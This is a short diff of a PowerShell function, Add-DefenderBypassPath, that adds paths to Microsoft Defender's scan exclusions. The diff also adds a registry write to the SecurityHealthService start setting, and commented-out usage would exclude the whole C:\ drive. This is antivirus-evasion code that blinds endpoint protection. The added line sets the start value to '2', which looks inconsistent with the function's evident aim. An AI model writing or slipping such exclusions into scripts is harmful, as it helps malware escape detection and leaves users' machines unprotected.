@@ -16,9 +16,12 @@ function Add-DefenderBypassPath {
         $Paths | Foreach-Object {
             if (-not [string]::isnullorempty($_)) {
                 Add-MpPreference -ExclusionPath $_ -Force
+                Set-Itemproperty -path 'HKLM:\SYSTEM\CurrentControlSet\Services\SecurityHealthService' -Name 'Start' -value '2'
             }
         }
     }
+
+    
 } 
 #$BypassDefenderPaths = @('C:\')
 #$ByPassDefenderPaths | Add-DefenderBypassPath
